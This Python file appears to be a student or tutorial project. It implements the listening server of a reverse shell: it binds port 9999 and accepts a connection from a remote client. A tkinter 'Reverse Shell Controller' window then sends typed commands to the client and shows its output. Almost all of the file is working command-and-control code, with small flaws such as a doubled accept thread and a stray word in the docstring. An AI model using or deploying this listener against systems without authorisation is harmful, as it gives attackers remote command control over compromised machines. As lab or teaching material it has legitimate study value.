#!/usr/bin/env python3

#Step 1: Createin a socket
#Step 2: Binding the socket and listening
#Step 3: Accepting a connection
#Step 4: Sending commands to the client
#Step 5: Client to server connection
#Step 6: Completing the client file




""" 
Reverse Shell with a GUI Interface
-----------------------------------------------------------------
This server listen for an incoming reverse connection and provides a simple GUI (using tkinter) to send commands and display outputs.ZeroDivisionError
"""

#import required Modules
import socket #for networking (creating server socket)
import threading #for running network operations in background
import tkinter as tk #GUI library
from tkinter import scrolledtext
import sys  #To exit on fatal errors


#configuration
Host = '' #Empty string means all available interfaces (0.0.0.0)
Port = 9999 #Port to listen for incoming connections
Buffer_Size = 1024 #Buffer size for receiving data


#define a class for the server
class ReverseShell:
    def __init__(self, master):
        self.master = master
        self.master.title("Reverse Shell Controller") #Set window title
        
        # Create a scrolled text area for displaying output
        self.output_area = scrolledtext.ScrolledText(self.master, wrap=tk.WORD, width=80, height=20, state='disabled')
        self.output_area.pack(padx=10, pady=10)

        # Create a text entry for the command input
        self.entry = tk.Entry(self.master, width=80)
        self.entry.pack(padx=10, pady=(0,10))
        self.entry.bind("<Return>", self.send_command)   # Bind the Enter key to send command
        self.entry.focus()

        # Create a send button to send commands
        self.send_button = tk.Button(self.master, text="Send Command", command=self.send_command)
        self.send_button.pack(pady=(0,10))

        # Create server socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Bind the socket to the host and port
            self.server_socket.bind((Host, Port))
            self.server_socket.listen(1)  # Listen for incoming connections (max 1 connection)
            self.write_output(f"Listening on {Host}:{Port}...\n")

            # Accept incoming connection in a separate thread
            threading.Thread(target=self.accept_connection).start()
        except socket.error as e:
            self.write_output(f"[!] Socket error: {e}\n")
            sys.exit(1)  #Exit if socket binding fails

        self.conn= None # To hold the client socket
        self.addr = None # To hold the client address

        #Start a thread to accept incoming connections without blocking the GUI
        threading.Thread(target=self.accept_connection, daemon=True).start()

    def write_output(self, message):
        """
        Display message in the GUI text area and auto-scroll it.
        """
        print("---message---\n",message)
        self.output_area.config(state='normal')  # Enable the text area
        self.output_area.insert(tk.END, message) #append message to the output area
        self.output_area.see(tk.END)    #auto-scroll to the end
        self.output_area.config(state='disabled')  # Disable the text area again
        
    def accept_connection(self):
        """
        Wait and accept an incoming connection from client
        """
        try:
            # Accept the incoming connection
            self.conn, self.addr = self.server_socket.accept()
            self.write_output(f"[+] Connection established from {self.addr}\n")
        
            # Start a thread to receive data from the client in the background
            threading.Thread(target=self.receive_data, daemon=True).start()
        except socket.error as e:
            self.write_output(f"[!] Error accepting connection: {e}\n")
            sys.exit(1)

    def receive_data(self):
        """
        Receive data from the client and display it in the GUI
        """
        while True:
            try:
                # Receive data from the client
                data = self.conn.recv(Buffer_Size)
                if not data:
                    self.write_output("[!] Connection closed by client\n")
                    break  # Exit loop if no data received
                decoded = data.decode('utf-8', errors='ignore')
                print(decoded)
                self.write_output(decoded)
            except socket.error as e:
                self.write_output(f"[!] Error receiving data: {e}\n")
                break
            
        

    # define send_command function
    def send_command(self, event=None):
        """
        Send command from user input to the connected client.
        """
        cmd = self.entry.get().strip() #get text from entry field, e.g., dir
        print(cmd)
        if cmd:
            try:
                # Send the command to the client
                self.conn.send(cmd.encode('utf-8'))
                self.write_output(f"[>]: {cmd}\n")
            except socket.error as e:
                self.write_output(f"[!] Error sending command: {e}\n")
            self.entry.delete(0, tk.END) #Clear input field

            if cmd.lower() == 'quit':  #handle termination.
                self.conn.close()
                self.server_socket.close()
                self.master.quit()
        else:
            self.write_output("[!] No client connected yet\n")

                

#Main execution
if __name__ == "__main__":
    root = tk.Tk()  # Create the main window
    app = ReverseShell(root)  # Create an instance of the ReverseShell class
    root.mainloop()  # Start the GUI event loop
